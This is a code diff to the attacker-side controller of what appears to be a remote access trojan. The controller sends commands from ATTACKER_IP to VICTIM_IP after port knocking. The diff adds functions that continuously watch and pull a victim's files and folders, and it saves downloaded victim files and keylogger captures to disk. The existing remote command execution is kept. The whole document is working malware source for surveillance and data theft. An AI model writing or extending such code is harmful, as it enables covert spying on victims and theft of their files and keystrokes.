@@ -1,7 +1,11 @@
+import threading
+
+from datetime import datetime
 from pathlib import Path
 
 from mods.knocking import send_port_knocks
-from mods.protocol import check_for_ack, send_data, receive_data
+from mods.monitoring import file_update_handler, dir_update_handler
+from mods.protocol import check_for_ack, send_data, receive_data, receive_data_stream
 from mods.shared import VICTIM_IP, ATTACKER_IP
 
 def handle_command(cmd: str, args: list[str], state: dict) -> str:
@@ -31,7 +35,7 @@ def handle_command(cmd: str, args: list[str], state: dict) -> str:
                 args_bytes = b' ' + ' '.join(args).encode()
             else:
                 args_bytes = b''
-            
+
             send_data(cmd.encode() + args_bytes, src=ATTACKER_IP, dst=VICTIM_IP)
             return f'Unknown command: {cmd}'
 
@@ -58,14 +62,13 @@ def handle_sf(args: list[str]) -> str:
 def handle_dl(args: list[str]) -> str:
     raw_path = args[0]
     filepath = Path(raw_path)
-    if not filepath.is_file():
-        return 'Not a valid file path'
     send_data(b'dl ' + raw_path.encode(), src=ATTACKER_IP, dst=VICTIM_IP)
     if not check_for_ack(from_ip=VICTIM_IP):
         return 'Victim unable to find file'
     file_bytes = receive_data(from_ip=VICTIM_IP)
-    with open(f'data_attacker/{filepath.name}', 'wb') as f:
-        f.write(file_bytes)
+    save_path = Path(f'data/attacker/{filepath.name}')
+    save_path.parent.mkdir(parents=True, exist_ok=True)
+    save_path.write_bytes(file_bytes)
     return f'Downloaded file: {filepath.name}'
 
 def handle_kstart(args: list[str], state: dict) -> str:
@@ -76,7 +79,11 @@ def handle_kstart(args: list[str], state: dict) -> str:
 def handle_kstop(args: list[str], state: dict) -> str:
     send_data(b'k-', src=ATTACKER_IP, dst=VICTIM_IP)
     file_bytes = receive_data(from_ip=VICTIM_IP)
-    return file_bytes.decode()
+    timestamp = datetime.now().strftime('%H_%M_%Y_%m_%d')
+    log_path = Path(f'data/attacker/keylog_{timestamp}')
+    log_path.parent.mkdir(parents=True, exist_ok=True)
+    log_path.write_bytes(file_bytes)
+    return f'Keylog saved to {log_path}'
 
 def handle_rn(args: list[str]) -> str:
     run_command = ' '.join(args)
@@ -86,13 +93,55 @@ def handle_rn(args: list[str]) -> str:
     res = receive_data(from_ip=VICTIM_IP)
     return res.decode()
 
+def _initiate_watch(cmd_bytes: bytes, recv_thread: threading.Thread, stop_event: threading.Event) -> bool:
+    recv_thread.start()
+    send_data(cmd_bytes, src=ATTACKER_IP, dst=VICTIM_IP)
+    if not check_for_ack(from_ip=VICTIM_IP, timeout=5):
+        stop_event.set()
+        recv_thread.join(timeout=2)
+        return False
+    return True
+
+def _watch_loop(stop_event: threading.Event, recv_thread: threading.Thread, watch_dir: Path, label: str) -> str:
+    print('Type "ew" to end watch.')
+    while True:
+        if input().strip() == 'ew':
+            send_data(b'ew', src=ATTACKER_IP, dst=VICTIM_IP)
+            stop_event.set()
+            recv_thread.join(timeout=5)
+            return f'{label} watch ended. Files in {watch_dir}'
+
 def handle_wf(args: list[str], state: dict) -> str:
-    # TODO: Implement watch files command with args[0] having path to file
-    return f'Command not supported yet'
+    if not args:
+        return 'Missing path argument'
+    path = args[0]
+    watch_dir = Path(f'data/watched/wf_{datetime.now().strftime("%H_%M_%Y_%m_%d")}')
+    stop_event = threading.Event()
+    recv_thread = threading.Thread(
+        target=receive_data_stream,
+        args=(VICTIM_IP, file_update_handler(watch_dir, Path(path).name), stop_event),
+        daemon=True,
+    )
+    if not _initiate_watch(b'wf ' + path.encode(), recv_thread, stop_event):
+        return 'Invalid path on victim'
+    watch_dir.mkdir(parents=True, exist_ok=True)
+    return _watch_loop(stop_event, recv_thread, watch_dir, 'File')
 
 def handle_wd(args: list[str], state: dict) -> str:
-    # TODO: Implement watch files command with args[0] having path to folder
-    return f'Command not supported yet'
+    if not args:
+        return 'Missing path argument'
+    path = args[0]
+    watch_dir = Path(f'data/watched/wd_{datetime.now().strftime("%H_%M_%Y_%m_%d")}')
+    stop_event = threading.Event()
+    recv_thread = threading.Thread(
+        target=receive_data_stream,
+        args=(VICTIM_IP, dir_update_handler(watch_dir), stop_event),
+        daemon=True,
+    )
+    if not _initiate_watch(b'wd ' + path.encode(), recv_thread, stop_event):
+        return 'Invalid path on victim'
+    watch_dir.mkdir(parents=True, exist_ok=True)
+    return _watch_loop(stop_event, recv_thread, watch_dir, 'Directory')
 
 def handle_dc(_: list[str], state: dict) -> str:
     # Implement graceful disconnect. Not much to be done here as there is no socket connection to close
